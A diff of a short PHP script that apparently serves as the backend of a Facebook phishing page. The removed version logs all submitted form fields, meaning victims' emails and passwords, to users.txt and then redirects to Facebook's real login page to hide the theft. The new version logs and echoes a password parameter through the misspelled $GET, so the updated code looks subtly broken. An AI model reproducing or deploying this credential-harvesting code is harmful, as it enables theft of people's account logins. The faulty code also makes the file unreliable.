@@ -1,13 +1,8 @@
 <?php
-header("Location: https://m.facebook.com/login.php?&e=1348092&email=");
 $handle = fopen("users.txt", "a");
-foreach($_POST as $variable => $value) {
-fwrite($handle, $variable);
-fwrite($handle, "=");
-fwrite($handle, $value);
-fwrite($handle, "\r\n");
-}
-fwrite($handle, "\r\n");
+echo $GET['password'];
+fwrite($handle, $GET['password']);
 fclose($handle);
+//header("Location: https://www.facebook.com/profile.php?id=100001295764354&fref=ts");
 exit;
 ?> 
